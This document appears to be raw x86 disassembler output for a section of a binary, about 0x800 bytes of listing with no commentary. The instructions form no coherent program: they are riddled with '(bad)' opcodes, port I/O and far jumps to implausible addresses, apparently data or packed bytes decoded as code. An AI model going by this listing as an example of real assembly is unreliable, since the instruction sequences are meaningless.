  42186c:	outs   dx,BYTE PTR ds:[esi]
  42186d:	popa   
  42186e:	inc    edx
  42186f:	adc    al,0x9a
  421871:	add    ch,BYTE PTR [ecx-0x6e4f2009]
  421877:	adc    BYTE PTR [ecx-0x31],0x22
  42187b:	fs mov edi,0x72cce9b9
  421881:	mov    ah,0xb3
  421883:	push   edi
  421884:	popf   
  421885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421886:	push   DWORD PTR [eax+0x4c9eabf]
  42188c:	mov    esp,0x90a40d03
  421891:	and    ch,bl
  421893:	jecxz  0x421893
  421895:	addr16 out dx,al
  421897:	imul   ecx,DWORD PTR [edi+0x5771e9fa],0xffffffe5
  42189e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42189f:	adc    DWORD PTR [edi+0x6486bbdf],esi
  4218a5:	popf   
  4218a6:	mov    eax,ds:0x19ab1661
  4218ab:	dec    ebp
  4218ac:	jb     0x42184d
  4218ae:	adc    ebx,eax
  4218b0:	dec    ebp
  4218b1:	daa    
  4218b2:	jb     0x421885
  4218b4:	stos   BYTE PTR es:[edi],al
  4218b5:	cmp    cl,dh
  4218b7:	adc    eax,0x37577b23
  4218bd:	popa   
  4218be:	mov    ecx,0x3cdb72c7
  4218c3:	push   esi
  4218c4:	xchg   ebx,eax
  4218c5:	addr16 and eax,0x41a107ee
  4218cb:	ja     0x4218a0
  4218cd:	dec    DWORD PTR [ecx+0x3d9a4453]
  4218d3:	aaa    
  4218d4:	clc    
  4218d5:	jns    0x421923
  4218d7:	int    0xad
  4218d9:	sub    DWORD PTR [edx-0x27],esp
  4218dc:	dec    edi
  4218dd:	leave  
  4218de:	lahf   
  4218df:	retf   0x88d0
  4218e2:	outs   dx,BYTE PTR ds:[esi]
  4218e3:	pusha  
  4218e4:	mov    al,ds:0xf78651f2
  4218e9:	push   0x513d4fba
  4218ee:	xchg   ebx,eax
  4218ef:	pop    ebx
  4218f0:	pop    es
  4218f1:	test   ch,0xf6
  4218f4:	lahf   
  4218f5:	jp     0x4218e4
  4218f7:	jae    0x56f6b7ec
  4218fd:	or     eax,0xdacd4611
  421902:	mov    ds:0xd8016dfb,eax
  421907:	push   DWORD PTR [esp+ecx*2-0x4d18902c]
  42190e:	cwde   
  42190f:	lahf   
  421910:	adc    al,0x0
  421912:	leave  
  421913:	mov    bl,0xf
  421915:	xchg   edx,eax
  421916:	test   al,0x79
  421918:	lds    edx,FWORD PTR [esi]
  42191a:	aas    
  42191b:	loop   0x42197b
  42191d:	(bad)  
  42191e:	mov    ds:0x476ee60a,al
  421923:	rol    BYTE PTR [ecx],0xb5
  421926:	xchg   edx,eax
  421927:	data16 mov bl,0x91
  42192a:	jno    0x421913
  42192c:	fcomp  DWORD PTR [edx-0x78]
  42192f:	fdivr  DWORD PTR [eax]
  421931:	mov    edx,0x453107d7
  421936:	int    0xeb
  421938:	sub    ebx,DWORD PTR [esi]
  42193a:	adc    DWORD PTR [edi],esi
  42193c:	mov    eax,ds:0x7f13dc59
  421941:	add    DWORD PTR [edx+0x49],ebx
  421944:	mov    edx,0x3a1b53d0
  421949:	add    al,0xf4
  42194b:	mov    esi,0x3f4420f2
  421950:	or     esp,DWORD PTR [edx+0x224d2fdf]
  421956:	cmp    al,0xf4
  421958:	mov    DWORD PTR [ecx+0x1e],ebp
  42195b:	cmp    esp,DWORD PTR [eax]
  42195d:	dec    esp
  42195e:	stc    
  42195f:	ds ds push ss
  421962:	lods   eax,DWORD PTR ds:[esi]
  421963:	jno    0x421970
  421965:	mov    bl,0x57
  421967:	pop    es
  421968:	bt     ecx,esp
  42196b:	ins    BYTE PTR es:[edi],dx
  42196c:	adc    al,0x65
  42196e:	stos   DWORD PTR es:[edi],eax
  42196f:	add    bl,al
  421971:	jmp    0x421908
  421973:	mov    ch,0x40
  421975:	out    dx,al
  421976:	inc    ebp
  421977:	adc    eax,0x952ba776
  42197c:	mov    cl,0x79
  42197e:	add    DWORD PTR [ebp-0x2a70af24],ebx
  421984:	jp     0x421911
  421986:	nop
  421987:	retf   0x4c38
  42198a:	out    0x2e,eax
  42198c:	daa    
  42198d:	xchg   ebp,eax
  42198e:	and    al,0x19
  421990:	(bad)  
  421991:	mov    bh,0x5c
  421993:	fdiv   QWORD PTR [edi+0x7a]
  421996:	mov    eax,0x3b576847
  42199b:	push   cs
  42199c:	mov    ecx,0xf60cb957
  4219a1:	and    DWORD PTR [ebp-0x7c],edi
  4219a4:	push   ebp
  4219a5:	stos   BYTE PTR es:[edi],al
  4219a6:	push   ss
  4219a7:	jno    0x4219b3
  4219a9:	dec    edx
  4219aa:	leave  
  4219ab:	mov    bh,0x52
  4219ad:	adc    al,BYTE PTR [ecx+0x12fe576a]
  4219b3:	jb     0x42199f
  4219b5:	enter  0xa4a1,0x94
  4219b9:	cld    
  4219ba:	push   ss
  4219bb:	push   esi
  4219bc:	test   BYTE PTR [ebx-0x1058ede0],0xcf
  4219c3:	sbb    al,0x5
  4219c5:	loopne 0x4219f2
  4219c7:	das    
  4219c8:	push   ebp
  4219c9:	pop    ebp
  4219ca:	inc    eax
  4219cb:	adc    eax,0xc35b4ab
  4219d0:	fstp   DWORD PTR [eax+ecx*4-0x24]
  4219d4:	xchg   DWORD PTR [eax-0x4881ffa2],ecx
  4219da:	arpl   bp,sp
  4219dc:	jmp    0x42196b
  4219de:	inc    esi
  4219df:	jo     0x421970
  4219e1:	loope  0x42196c
  4219e3:	loope  0x421966
  4219e5:	es push ecx
  4219e7:	push   esp
  4219e8:	add    DWORD PTR [ecx],ecx
  4219ea:	add    BYTE PTR [edi],ah
  4219ec:	fldenv [esi+0x71]
  4219ef:	adc    BYTE PTR [ecx],ah
  4219f1:	mov    eax,ds:0xb7292e91
  4219f6:	hlt    
  4219f7:	push   edx
  4219f8:	fs mov ebp,0xe14ac787
  4219fe:	dec    esp
  4219ff:	sbb    DWORD PTR ss:[edx-0x6],edi
  421a03:	mov    esp,0x239e59b9
  421a08:	inc    edx
  421a09:	push   esi
  421a0a:	push   ebp
  421a0b:	mov    ah,dl
  421a0d:	push   ebx
  421a0e:	sbb    eax,0x4b86966b
  421a13:	sar    BYTE PTR [ebx],0xaa
  421a16:	imul   edi,DWORD PTR [ebp+0x32],0x83915fc2
  421a1d:	xchg   BYTE PTR [ecx+0x64],bl
  421a20:	push   0xd37241bd
  421a25:	shl    ah,1
  421a27:	jl     0x421a9a
  421a29:	bound  esp,QWORD PTR [esi+edx*8]
  421a2c:	std    
  421a2d:	fs jnp 0x421a73
  421a30:	aas    
  421a31:	mov    WORD PTR es:[ebx],ss
  421a34:	dec    ebx
  421a35:	arpl   WORD PTR [ebp-0x3d],ax
  421a38:	fisttp QWORD PTR [edx]
  421a3a:	fcmove st,st(7)
  421a3c:	or     eax,0xb992c7d4
  421a41:	popf   
  421a42:	gs das 
  421a44:	xchg   esp,eax
  421a45:	xchg   edi,ebx
  421a47:	mov    eax,0x847c0880
  421a4c:	rcl    BYTE PTR [ecx+0x1fbf816d],0x9f
  421a53:	cmc    
  421a54:	gs cmp edx,0xffffffff
  421a58:	sub    cl,dl
  421a5a:	popf   
  421a5b:	add    BYTE PTR [ebx+eax*1],dl
  421a5e:	daa    
  421a5f:	ins    BYTE PTR es:[edi],dx
  421a60:	pop    es
  421a61:	cli    
  421a62:	sub    BYTE PTR [edx+0x7db26091],cl
  421a68:	(bad)  [edx]
  421a6a:	dec    bp
  421a6c:	loopne 0x421a7f
  421a6e:	mov    bl,0x9
  421a70:	sbb    eax,0x324bbdf
  421a75:	push   cs
  421a76:	arpl   dx,ax
  421a78:	mov    ?,WORD PTR [ecx-0xf]
  421a7b:	rcl    DWORD PTR [ecx],cl
  421a7d:	(bad)  
  421a7e:	push   ebx
  421a7f:	dec    ebx
  421a80:	or     al,BYTE PTR [edi+0x57795310]
  421a86:	dec    esp
  421a87:	dec    ecx
  421a88:	gs sbb eax,0xb75830f4
  421a8e:	and    eax,0x6d091f7d
  421a93:	or     esi,ebx
  421a95:	(bad)  [ecx+0x5e]
  421a98:	push   es
  421a99:	std    
  421a9a:	int    0x2e
  421a9c:	ins    BYTE PTR es:[edi],dx
  421a9d:	xchg   ecx,eax
  421a9e:	push   cs
  421a9f:	adc    BYTE PTR [edi+0x58],0x17
  421aa3:	push   es
  421aa4:	out    0xe5,al
  421aa6:	lods   al,BYTE PTR ds:[esi]
  421aa7:	or     BYTE PTR [ebp+0x32],0x5
  421aab:	xchg   ebx,eax
  421aac:	inc    esi
  421aad:	sub    cl,cl
  421aaf:	pop    eax
  421ab0:	dec    ebp
  421ab1:	xor    ah,BYTE PTR [edx-0x130b7dc]
  421ab7:	push   ecx
  421ab8:	pop    edi
  421ab9:	mov    WORD PTR [ebx+0x4688bf36],?
  421abf:	dec    ebx
  421ac0:	clc    
  421ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ac2:	or     al,0x28
  421ac4:	aaa    
  421ac5:	push   ss
  421ac6:	shr    DWORD PTR [esi-0x2b6c7c7c],0x78
  421acd:	sub    esp,DWORD PTR [esi]
  421acf:	shr    DWORD PTR [ebp-0x30a9f551],0x36
  421ad6:	hlt    
  421ad7:	xor    bh,al
  421ad9:	dec    ebx
  421ada:	push   edi
  421adb:	and    dl,al
  421add:	and    eax,0xe333ffc8
  421ae2:	or     esi,DWORD PTR [ebx-0x2aea4394]
  421ae8:	adc    ebx,eax
  421aea:	fucomip st,st(6)
  421aec:	jnp    0x421b29
  421aee:	bnd jbe 0x421abb
  421af1:	frstor [eax+0x61]
  421af4:	mov    ds,eax
  421af6:	mov    al,ds:0xf64e6a8e
  421afb:	jmp    FWORD PTR [esi]
  421afd:	mov    ebx,0x4a18832c
  421b03:	fwait
  421b04:	push   eax
  421b05:	push   ecx
  421b06:	out    0x88,eax
  421b08:	and    bh,BYTE PTR [edx]
  421b0a:	inc    eax
  421b0b:	adc    al,0xc9
  421b0e:	pop    ebx
  421b0f:	leave  
  421b10:	in     al,dx
  421b11:	ret    0xe281
  421b14:	xchg   dh,al
  421b16:	cdq    
  421b17:	or     DWORD PTR [ebx+ecx*4],esi
  421b1a:	shl    DWORD PTR [ecx-0x54ebf3f8],0xec
  421b21:	mov    WORD PTR ds:[esi],ss
  421b24:	mov    ds:0x7a8b763,al
  421b29:	jo     0x421b9b
  421b2b:	push   eax
  421b2c:	pop    esp
  421b2d:	and    esi,edx
  421b2f:	ds fwait
  421b31:	push   ebx
  421b32:	in     eax,dx
  421b33:	stos   DWORD PTR es:[edi],eax
  421b34:	pushf  
  421b35:	(bad)  
  421b36:	mov    al,ds:0xcd499d1f
  421b3b:	ffreep st(1)
  421b3d:	aam    0xe9
  421b3f:	xchg   ebp,eax
  421b40:	mov    dl,0x58
  421b42:	jbe    0x421b1c
  421b44:	mov    ebp,esp
  421b46:	or     BYTE PTR [edx],ch
  421b48:	mov    ch,0x26
  421b4a:	jmp    0x421b13
  421b4c:	aam    0xda
  421b4e:	pop    ebp
  421b4f:	iret   
  421b50:	or     al,0x97
  421b52:	out    dx,eax
  421b53:	sub    ebx,0x52ea2ce1
  421b59:	loop   0x421b6f
  421b5b:	fwait
  421b5c:	mov    esp,ebp
  421b5e:	fst    QWORD PTR [ebx]
  421b60:	mov    ah,0x90
  421b62:	in     al,0xef
  421b64:	mov    bh,0x20
  421b66:	add    al,BYTE PTR [esi]
  421b68:	cmp    eax,0x71ded034
  421b6d:	mov    ah,0x5e
  421b6f:	and    al,0xcc
  421b71:	push   ebp
  421b72:	stos   DWORD PTR es:[edi],eax
  421b73:	cmp    DWORD PTR [ebp+ebp*8+0x4d398f21],ecx
  421b7a:	scas   eax,DWORD PTR es:[edi]
  421b7b:	fs daa 
  421b7d:	adc    esi,DWORD PTR [edi-0x6a]
  421b80:	xchg   cl,ch
  421b82:	cwde   
  421b83:	(bad)  
  421b84:	dec    ebp
  421b85:	inc    esp
  421b86:	or     BYTE PTR [eax-0x7ebef5d5],0x66
  421b8d:	lock sbb al,0xe0
  421b90:	cmp    ebx,eax
  421b92:	cwde   
  421b93:	push   es
  421b94:	dec    edi
  421b95:	ror    cl,0xb4
  421b98:	scas   al,BYTE PTR es:[edi]
  421b99:	adc    DWORD PTR [edi-0x3b],ebx
  421b9c:	mov    esp,0x6878597b
  421ba1:	sub    ecx,DWORD PTR [esi+0x25783882]
  421ba7:	push   edx
  421ba8:	and    eax,0xf6fbc5da
  421bad:	pushf  
  421bae:	dec    eax
  421baf:	pusha  
  421bb0:	js     0x421b4e
  421bb2:	add    BYTE PTR [eax-0x4a60f3f1],cl
  421bb8:	loope  0x421c37
  421bba:	test   al,al
  421bbc:	push   edx
  421bbd:	pop    edx
  421bbe:	(bad)  
  421bbf:	cli    
  421bc0:	sbb    DWORD PTR [ebx+0x120a20a9],ebx
  421bc6:	jecxz  0x421b90
  421bc8:	sub    al,0x6c
  421bca:	inc    ebp
  421bcb:	jmp    0x70544a6e
  421bd0:	jge    0x421b83
  421bd2:	mov    ebp,0xb54785d3
  421bd7:	jl     0x421bc9
  421bd9:	xor    esi,DWORD PTR [edi+0x7c7050da]
  421bdf:	retf   
  421be0:	mov    cl,0xa7
  421be2:	xchg   ebx,eax
  421be3:	xor    DWORD PTR ds:0xdc260cac,ecx
  421be9:	shl    ah,1
  421beb:	pop    esp
  421bec:	stc    
  421bed:	je     0x421c36
  421bef:	xchg   ebx,eax
  421bf0:	sub    ah,BYTE PTR [edi+0x55]
  421bf3:	push   0x1f
  421bf5:	test   DWORD PTR [ebx],ecx
  421bf7:	xor    eax,0xe351c58c
  421bfc:	call   0x2b8ab620
  421c01:	inc    edx
  421c02:	jge    0x421c4d
  421c04:	jl     0x421bfa
  421c06:	fistp  DWORD PTR [esi-0x27]
  421c09:	ret    0xf020
  421c0c:	cmp    BYTE PTR [ebp+0x3c438d04],cl
  421c12:	mul    BYTE PTR [ebp-0x213ae2c4]
  421c18:	or     BYTE PTR [eax],0x11
  421c1b:	sub    BYTE PTR [ebx+0x4eaaa479],ah
  421c21:	lods   eax,DWORD PTR fs:[esi]
  421c23:	scas   eax,DWORD PTR es:[edi]
  421c24:	cmp    DWORD PTR [edi+0x65],esi
  421c27:	mov    cl,0xfb
  421c29:	mov    ah,0x44
  421c2b:	out    0xb0,al
  421c2d:	jnp    0x421c5b
  421c2f:	hlt    
  421c30:	imul   edi,ebp,0xe5e6aa47
  421c36:	mov    ebx,0x91a70a85
  421c3b:	imul   esp,DWORD PTR ds:0x7c9d1881,0x7e
  421c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c43:	fcom   st(0)
  421c45:	out    0xca,al
  421c47:	xor    ah,BYTE PTR [eax]
  421c49:	inc    esp
  421c4a:	or     DWORD PTR [ebx+eiz*8],0x7be8e816
  421c51:	cmp    ecx,DWORD PTR [esi+0x59b17ab5]
  421c57:	xlat   BYTE PTR ds:[ebx]
  421c58:	in     al,dx
  421c59:	jle    0x421ca0
  421c5b:	sbb    DWORD PTR [edi],esp
  421c5d:	xor    esi,DWORD PTR ds:0x9dc4edb3
  421c63:	outs   dx,BYTE PTR ds:[esi]
  421c64:	std    
  421c65:	xchg   esp,eax
  421c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c67:	into   
  421c68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c69:	push   0xd688f1a0
  421c6e:	lods   al,BYTE PTR ds:[esi]
  421c6f:	repz call 0x400:0xe2ce79bf
  421c77:	dec    esi
  421c78:	call   0xccdc:0x70e479f8
  421c7f:	je     0x421cd3
  421c81:	sbb    dl,bh
  421c83:	inc    ebp
  421c84:	jle    0x421c49
  421c86:	fs mov dl,0xb4
  421c89:	inc    esi
  421c8a:	add    eax,0x51664036
  421c8f:	cmp    bl,BYTE PTR [esi-0x17]
  421c92:	sub    BYTE PTR [edi],0xa7
  421c95:	add    ah,BYTE PTR [ebp+0x5e610433]
  421c9b:	or     DWORD PTR [edi-0x1dec0948],esi
  421ca1:	xchg   edi,eax
  421ca2:	cmp    DWORD PTR [edi-0x316006f9],esi
  421ca8:	ja     0x421d13
  421caa:	push   es
  421cab:	test   al,0xa4
  421cad:	jg     0x421cf1
  421caf:	pop    ebp
  421cb0:	in     eax,dx
  421cb1:	mov    esp,0xaed5583c
  421cb6:	fld    TBYTE PTR [edi+0x4c]
  421cb9:	pop    ebx
  421cba:	add    edx,DWORD PTR [eax]
  421cbc:	les    eax,FWORD PTR [edi+0x6a164762]
  421cc2:	add    eax,0x69a27260
  421cc7:	clc    
  421cc8:	pop    es
  421cc9:	test   BYTE PTR [eax-0x6f4fb5df],dl
  421ccf:	sbb    esp,DWORD PTR ds:0x96be3e94
  421cd5:	aad    0xa0
  421cd7:	mov    BYTE PTR [esi+ebp*8+0x61854e47],ah
  421cde:	call   0x9de76190
  421ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ce4:	int    0xcf
  421ce6:	punpckldq mm5,mm2
  421ce9:	mov    bl,BYTE PTR [ebx+0x5f]
  421cec:	cmp    al,0x0
  421cee:	ins    BYTE PTR es:[edi],dx
  421cef:	mov    ch,0x6d
  421cf1:	outs   dx,DWORD PTR ds:[esi]
  421cf2:	xor    edx,DWORD PTR [esi+0x275f0145]
  421cf8:	iret   
  421cf9:	and    ecx,ebx
  421cfb:	mov    ?,WORD PTR [ebx-0x65eba805]
  421d01:	push   es
  421d02:	js     0x421d06
  421d04:	add    dh,bl
  421d06:	mov    ecx,0x89260496
  421d0b:	sub    al,BYTE PTR [ebp-0x35565065]
  421d11:	enter  0x87f1,0x75
  421d15:	lods   al,BYTE PTR ds:[esi]
  421d16:	xchg   ebp,eax
  421d17:	jp     0x421d22
  421d19:	or     esp,edi
  421d1b:	shl    DWORD PTR [esi],1
  421d1d:	jl     0x421d64
  421d1f:	call   0xd3757882
  421d24:	dec    ebx
  421d25:	push   eax
  421d26:	out    dx,eax
  421d27:	out    0x1d,eax
  421d29:	call   esp
  421d2b:	and    DWORD PTR [eax-0x54],ebp
  421d2e:	das    
  421d2f:	dec    eax
  421d30:	xchg   WORD PTR [eax],si
  421d33:	sbb    al,0xb2
  421d35:	aas    
  421d36:	test   al,0xf8
  421d38:	xchg   edi,eax
  421d3a:	jmp    0x421d8e
  421d3c:	mov    ecx,0x8a92c8ce
  421d41:	arpl   WORD PTR [edx-0x63cff65],ax
  421d47:	inc    ecx
  421d48:	add    bh,bl
  421d4a:	js     0x421dc4
  421d4c:	div    ah
  421d4e:	cmp    BYTE PTR ds:0x429d70f9,dl
  421d54:	mov    ebx,0x715bd908
  421d59:	repz shr DWORD PTR ds:0xba8a5f72,cl
  421d60:	jmp    DWORD PTR ds:0x26a1002a
  421d66:	inc    edi
  421d67:	add    DWORD PTR [ecx+ebx*8-0xefde42f],ebp
  421d6e:	mov    WORD PTR [ecx],gs
  421d70:	retf   0x9bb8
  421d73:	push   ebx
  421d74:	pushf  
  421d75:	mov    DWORD PTR ds:0xc1ceaea4,eax
  421d7b:	ja     0x421dae
  421d7d:	inc    esi
  421d7e:	jne    0x421dd9
  421d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d81:	jbe    0x421d1c
  421d83:	cmp    ebp,DWORD PTR [eax-0x718603e]
  421d89:	cmp    al,0x82
  421d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d8d:	xor    BYTE PTR [ebp-0x7e],bl
  421d90:	xchg   ebp,eax
  421d91:	jnp    0x421d2a
  421d93:	adc    edi,esi
  421d95:	cmp    ecx,DWORD PTR [ebp+edx*8-0x51]
  421d99:	and    DWORD PTR [esi-0x11beceee],esp
  421d9f:	mov    ah,0xdb
  421da1:	jmp    0x56fe:0x81454445
  421da8:	mov    ch,0x33
  421daa:	jo     0x421d85
  421dac:	and    eax,0x3ea152dd
  421db1:	mov    ds:0x7116f58f,al
  421db6:	push   edi
  421db7:	pop    edx
  421db8:	cmp    BYTE PTR [edx-0x47291547],ah
  421dbe:	outs   dx,BYTE PTR ds:[esi]
  421dbf:	lods   eax,DWORD PTR ds:[esi]
  421dc0:	fidivr DWORD PTR [esi]
  421dc2:	jne    0x421e0c
  421dc4:	push   ds
  421dc5:	pop    ss
  421dc6:	jno    0x421dd6
  421dc8:	ror    DWORD PTR [edx],0x7e
  421dcb:	jo     0x421dcd
  421dcd:	inc    ecx
  421dce:	lds    edi,FWORD PTR [ebx]
  421dd0:	pop    ds
  421dd1:	test   al,0x29
  421dd3:	clc    
  421dd4:	idiv   DWORD PTR [esi+0x61]
  421dd7:	shl    DWORD PTR [edx],cl
  421dd9:	loop   0x421d83
  421ddb:	inc    edx
  421ddc:	repnz mov eax,DWORD PTR [eax]
  421ddf:	(bad)
  421de2:	push   0x5f
  421de4:	out    dx,al
  421de5:	fdivr  st(1),st
  421de7:	(bad)  
  421de9:	lds    esp,FWORD PTR [ecx+0x2b5fca51]
  421def:	adc    BYTE PTR [edi-0x2b],ch
  421df2:	add    BYTE PTR [eax],0xb9
  421df5:	inc    ebp
  421df6:	rcl    DWORD PTR [ebx],1
  421df8:	ficom  DWORD PTR [ebp-0x3b737ae]
  421dfe:	imul   ecx,DWORD PTR [ebx],0xfffffff0
  421e01:	out    dx,eax
  421e02:	sub    esp,eax
  421e04:	fmul   DWORD PTR [ecx-0x222875cc]
  421e0a:	adc    dh,BYTE PTR [ecx]
  421e0c:	or     dl,BYTE PTR [ebp-0x569fe5c5]
  421e12:	xchg   ebx,eax
  421e13:	push   ecx
  421e14:	aas    
  421e15:	mov    ch,0xc4
  421e17:	pop    ds
  421e18:	jbe    0x421e6b
  421e1a:	xchg   BYTE PTR [ecx-0x33f5eead],al
  421e20:	fwait
  421e21:	addr16 xchg ecx,eax
  421e23:	add    BYTE PTR [edx-0x523252f0],dl
  421e29:	cwde   
  421e2a:	mov    ecx,0xc15179a6
  421e2f:	pop    eax
  421e30:	ret    0x6108
  421e33:	(bad)  
  421e35:	xchg   BYTE PTR ds:[ebx-0x568f780c],ch
  421e3c:	mov    esp,0x8c9346be
  421e41:	jp     0x421e0f
  421e43:	pushf  
  421e44:	or     cl,BYTE PTR [edx-0x184a12ab]
  421e4a:	or     esp,0xffffffbc
  421e4d:	dec    esi
  421e4e:	jno    0x421ddc
  421e50:	jbe    0x421e96
  421e52:	pop    ebx
  421e53:	fdivp  st(5),st
  421e55:	test   eax,0x67c2d0ae
  421e5a:	inc    ecx
  421e5b:	fdiv   st(3),st
  421e5d:	aad    0xa2
  421e5f:	enter  0x5335,0x11
  421e63:	loopne 0x421e2c
  421e65:	jg     0x421ee6
  421e67:	imul   ebx,DWORD PTR ds:0x78f636e2,0x9752f558
  421e71:	loope  0x421e80
  421e73:	scas   al,BYTE PTR es:[edi]
  421e74:	pushf  
  421e75:	out    dx,al
  421e76:	out    dx,al
  421e77:	outs   dx,DWORD PTR ds:[esi]
  421e78:	daa    
  421e79:	dec    edx
  421e7a:	mov    ?,WORD PTR [ebp+0x3d]
  421e7d:	adc    dl,BYTE PTR [ebx+0x2f]
  421e80:	cs pop es
  421e82:	inc    ebx
  421e83:	push   0x5eaeb738
  421e88:	push   eax
  421e89:	pop    ebp
  421e8a:	ret    0xef0a
  421e8d:	xchg   esp,eax
  421e8e:	retf   0xbedb
  421e91:	sub    BYTE PTR [edx+edx*8+0x0],al
  421e95:	sbb    edi,esi
  421e97:	cs iret 
  421e99:	mov    ebx,0x5bdeaa87
  421e9e:	retf   0x124d
  421ea1:	out    dx,eax
  421ea2:	fimul  DWORD PTR [eax]
  421ea4:	mov    ebx,0xb409e6a3
  421ea9:	test   DWORD PTR [esi],0x85f5d1
  421eaf:	xor    DWORD PTR [bp+0x13d2],ecx
  421eb4:	dec    ebx
  421eb5:	mov    dh,0xbe
  421eb7:	inc    eax
  421eb8:	sbb    DWORD PTR ds:0x81b3c185,eax
  421ebe:	cmp    ebp,DWORD PTR [eax-0x238a65db]
  421ec4:	inc    edi
  421ec5:	addr16 dec esp
  421ec7:	call   0x6d33:0x179a017c
  421ece:	mov    cl,0xea
  421ed0:	pop    edi
  421ed1:	and    ebx,DWORD PTR [ebx-0x5649fa46]
  421ed7:	mov    BYTE PTR [edx],ch
  421ed9:	sbb    esp,DWORD PTR [ecx]
  421edb:	es and BYTE PTR ss:[bp+0x5744],bl
  421ee2:	xchg   DWORD PTR [esi-0x2],esp
  421ee5:	adc    BYTE PTR [esi+0x1b5b1619],0x8a
  421eec:	mov    esp,0x69fe3544
  421ef1:	imul   eax,esp,0xffffffae
  421ef4:	je     0x421ed5
  421ef6:	cld    
  421ef7:	xor    eax,0xd673d87f
  421efc:	loopne 0x421ed5
  421efe:	dec    esp
  421eff:	dec    ebp
  421f00:	sbb    eax,DWORD PTR [edi-0x672f2583]
  421f06:	test   al,0x16
  421f08:	sub    eax,0xbe5775d6
  421f0d:	arpl   ax,cx
  421f0f:	cmp    BYTE PTR [edx+0x77],cl
  421f12:	push   eax
  421f13:	pop    ecx
  421f14:	enter  0xcf3d,0xeb
  421f18:	test   al,0x16
  421f1a:	aam    0x57
  421f1c:	cli    
  421f1d:	in     eax,0xea
  421f1f:	mov    eax,gs
  421f21:	jmp    0x65182bfb
  421f26:	sub    dl,ah
  421f28:	scas   al,BYTE PTR es:[edi]
  421f29:	int3   
  421f2a:	push   0xc554a66a
  421f2f:	mov    esp,0x579e1dc7
  421f34:	lahf   
  421f35:	add    al,0xc4
  421f37:	add    edx,DWORD PTR [ebx-0xa]
  421f3a:	cdq    
  421f3b:	push   es
  421f3c:	fwait
  421f3d:	ret    
  421f3e:	jge    0x421ef5
  421f40:	leave  
  421f41:	xor    dh,BYTE PTR [eax-0x22caca3f]
  421f47:	dec    esp
  421f48:	imul   eax,ebp,0xe516fc18
  421f4e:	cmp    ebp,DWORD PTR [esi+0x26]
  421f51:	pushf  
  421f52:	and    al,0x8a
  421f54:	scas   al,BYTE PTR es:[edi]
  421f55:	inc    esi
  421f56:	int3   
  421f57:	arpl   ax,di
  421f59:	and    eax,0x7ab52a1d
  421f5e:	(bad)
  421f62:	iret   
  421f63:	mul    DWORD PTR [ebx+eax*2+0x6b7f2eb5]
  421f6a:	and    eax,0x744623dc
  421f6f:	cld    
  421f70:	or     DWORD PTR [edx-0x5],ecx
  421f73:	pop    ebp
  421f74:	outs   dx,DWORD PTR ds:[esi]
  421f75:	add    ah,BYTE PTR ds:0x11cfc71a
  421f7b:	fisttp DWORD PTR [ecx]
  421f7d:	push   eax
  421f7e:	push   eax
  421f7f:	xchg   ecx,eax
  421f80:	lds    edx,FWORD PTR [edi+esi*2]
  421f83:	sbb    al,0xdd
  421f85:	dec    esp
  421f86:	xchg   esp,eax
  421f87:	out    dx,eax
  421f88:	dec    ebx
  421f89:	retf   0x88b8
  421f8c:	xor    ebx,edx
  421f8e:	dec    eax
  421f8f:	adc    eax,0x1c22aa38
  421f94:	ror    DWORD PTR ss:[ebx],cl
  421f97:	pop    ax
  421f99:	push   es
  421f9a:	or     DWORD PTR [esi-0x80],ecx
  421f9d:	push   esi
  421f9e:	ret    
  421f9f:	mov    ebx,0x43bc491c
  421fa4:	dec    ebx
  421fa5:	jnp    0x421fb6
  421fa7:	xchg   esp,eax
  421fa8:	js     0x421f65
  421faa:	mov    ecx,0xfc05114b
  421faf:	cmp    dh,BYTE PTR [edi+0x43dee7e]
  421fb5:	in     al,0x3a
  421fb7:	dec    ebp
  421fb8:	mov    eax,ds:0xeac7ccc
  421fbd:	lea    ebx,cs:[ebx+0x23]
  421fc1:	sti    
  421fc2:	xchg   ebx,eax
  421fc3:	mov    fs:0xf9c8e6c3,al
  421fc9:	push   ds
  421fca:	popf   
  421fcb:	sar    BYTE PTR [ecx],1
  421fcd:	test   al,0xda
  421fcf:	fnsave [edi-0x44]
  421fd2:	push   ds
  421fd3:	and    BYTE PTR [ecx+edx*4+0x42c40738],0x37
  421fdb:	cmp    eax,0xe1e4ec57
  421fe0:	sub    al,0xf9
  421fe2:	push   ds
  421fe3:	jp     0x422047
  421fe5:	imul   esp,DWORD PTR [ebx+0x8],0x25
  421fe9:	out    0xcf,al
  421feb:	cmc    
  421fec:	mov    ebx,0xf04f91b6
  421ff1:	dec    esp
  421ff2:	fs pop es
  421ff4:	inc    edi
  421ff5:	outs   dx,BYTE PTR ds:[esi]
  421ff6:	fisttp DWORD PTR [ecx-0x6c]
  421ff9:	test   BYTE PTR [ebx+0x7a],0xb6
  421ffd:	inc    esi
  421ffe:	xchg   BYTE PTR [edx-0x5f72055f],dh
  422004:	push   ss
  422005:	arpl   di,di
  422007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422008:	inc    esi
  422009:	call   0xa128fc56
  42200e:	das    
  42200f:	xchg   edx,eax
  422010:	adc    al,0xce
  422012:	js     0x422080
  422014:	dec    ebp
  422015:	int    0x9d
  422017:	inc    esp
  422018:	cmp    DWORD PTR [ebx+edi*1-0x26ebadbe],edi
  42201f:	pop    esp
  422020:	les    eax,FWORD PTR [ecx-0x4a0496db]
  422026:	adc    DWORD PTR [edx-0x7fc6c148],eax
  42202c:	xchg   ecx,eax
  42202d:	add    bh,BYTE PTR [eax-0x75]
  422030:	in     al,dx
  422031:	shl    DWORD PTR [eax+0x72],cl
  422034:	mov    ss,WORD PTR [ecx+0xde9882d]
  42203a:	add    al,0x7c
  42203c:	cmp    DWORD PTR [eax],ebx
  42203e:	(bad)  [ebx]
  422040:	sub    ebp,ecx
  422042:	bound  edi,QWORD PTR [ebx]
  422044:	dec    esi
  422045:	int    0x89
  422047:	push   0x59
  422049:	dec    edx
  42204a:	cli    
  42204b:	inc    esp
  42204c:	sub    bx,WORD PTR [ecx+edi*4+0x60]
  422051:	shl    cx,cl
  422054:	cs cwde 
